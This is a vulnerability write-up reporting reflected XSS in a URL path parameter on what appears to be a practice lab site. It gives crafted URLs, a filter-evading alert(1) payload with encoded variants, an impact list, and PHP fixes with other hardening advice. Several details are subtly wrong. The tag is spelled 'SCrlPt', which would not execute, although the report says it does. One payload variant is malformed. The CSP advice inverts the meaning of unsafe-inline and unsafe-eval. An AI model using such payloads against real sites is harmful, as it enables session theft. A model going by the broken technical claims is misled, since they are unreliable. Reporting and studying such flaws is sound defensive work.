# Reflected XSS in URL Path Parameter

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the URL path parameter of the application's messaging functionality.

The application accepts user-controlled input through the URL path and reflects it back to the page without proper sanitization or output encoding. By injecting a `<SCrlPt>` tag with mixed-case formatting directly into the URL path, arbitrary code execution is achieved when the victim visits the crafted URL.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameter

```text
URL Path (account parameter)
```

## Vulnerable URL

```text
https://kzlabs.in/58.php/account/">anil<SCrlPt>alert(1)</SCrlPt>/messages
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the value in the URL path with the following payload:

   ```text
   account/">anil<SCrlPt>alert(1)</SCrlPt>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/58.php/account/%22%3Eanil%3CSCrlPt%3Ealert%281%29%3C%2FSCrlPt%3E/messages
   ```

4. Observe that the browser executes the injected payload and displays an `alert(1)` popup.

## Payloads Used

```text
account/">anil<SCrlPt>alert(1)</SCrlPt>
```

URL-encoded version:
```text
account/%22%3Eanil%3CSCrlPt%3Ealert%281%29%3C%2FSCrlPt%3E
```

Alternative payload observed:
```text
account/%22%3Eanil%3C%2FSCrlPt%3Ealert%281%29%3C%2FSCrlPt%3E
```

## Proof of Concept

The application accepts the value of the URL path parameter and reflects it directly into the page HTML without proper sanitization.

The payload works by:
1. Breaking out of the existing HTML context using `">`
2. Injecting a `<SCrlPt>` tag with mixed-case formatting to evade case-sensitive filters
3. The browser parses and executes the injected script tag regardless of case
4. The `alert(1)` function executes, displaying a popup

```html
<!-- Injected payload rendered in the page: -->
"><script>alert(1)</script>
```

The payload is reflected in the user profile section, confirming the vulnerability.

<img width="1433" height="348" alt="Screenshot 2026-08-14 203629" src="https://github.com/user-attachments/assets/b236050e-e7c4-4ef5-8cb7-bd75b315912f" />

<img width="1537" height="440" alt="Screenshot 2026-08-14 203559" src="https://github.com/user-attachments/assets/14d70c8f-bd68-4380-b757-a310a52746f6" />

## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass case-sensitive filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  $account = htmlspecialchars($_GET['account'], ENT_QUOTES, 'UTF-8');
  echo $account;
  ```

- **URL Path Validation**: Validate and sanitize all user inputs, including URL path parameters. Consider using a whitelist approach to allow only safe characters.
  ```php
  $account = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['account']);
  ```

- **Case-Insensitive Filtering**: If implementing input filtering, ensure it is case-insensitive by converting all input to lowercase or using case-insensitive pattern matching.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and unauthorized script sources using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes regardless of case.

- **Avoid Direct Reflection**: Consider avoiding the direct reflection of user input in the response. Use server-side validation and sanitization before output.

---
